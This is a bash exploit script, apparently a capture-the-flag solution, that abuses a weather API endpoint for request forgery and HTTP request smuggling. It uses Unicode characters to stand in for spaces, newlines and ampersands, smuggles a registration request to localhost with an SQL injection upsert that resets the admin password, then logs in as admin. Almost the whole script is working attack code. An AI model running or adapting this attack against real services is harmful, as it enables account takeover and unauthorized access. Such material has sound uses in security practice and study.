#smuggling char replacements
spc=$'Ġ'
nwl=$'Ċ'
amp=$'Ħ'

#SQLi upsert attack
username="admin"
yourpass="pass"
upsert="') ON CONFLICT(username) DO UPDATE SET password='${yourpass}' --+-"
urle_spaces="${upsert// /%20}"
urle_sqli="${urle_spaces//\'/%27}"

#smuggle body
sbody="username=${username}${amp}password=admin${urle_sqli}"
sbody_len=$((${#sbody}+2))  #off by one for some reason (likely due to ampersand unicode encoding specifics)

#main POST
localhost="127.0.0.1:80"
mbody="endpoint=${localhost}&city=${spc}"

#send keepalive for original request
mbody+="HTTP/1.1${nwl}"
mbody+="Host:${spc}${localhost}${nwl}"
mbody+="Connection:${spc}keep-alive${nwl}${nwl}${nwl}"

#new POST request to register page
mbody+="POST${spc}/register${spc}HTTP/1.1${nwl}"
mbody+="Host:${spc}${localhost}${nwl}"
mbody+="Content-Type:${spc}application/x-www-form-urlencoded${nwl}"
mbody+="User-Agent:${spc}Mozilla/5.0${spc}(X11;${spc}Linux${spc}x86_64;${spc}rv:85.0)${spc}Gecko/20100101${spc}Firefox/85.0${nwl}"
mbody+="Connection:${spc}keep-alive${nwl}"
mbody+="Content-Length:${spc}${sbody_len}${nwl}${nwl}"

#test GET request here
test="${nwl}${nwl}GET${spc}/?&country=register"

request=${mbody}${sbody}${test}

# export the request
echo "$request" > request.txt

ip="$1"
port="$2"

echo "Sending register request"
curl -d "@request.txt" -X POST "http://${ip}:${port}/api/weather" -p -x 127.0.0.1:8080 &> /dev/null

echo "Sending login request"
curl -d "username=${username}&password=${yourpass}" -X POST "http://${ip}:${port}/login" -p -x 127.0.0.1:8080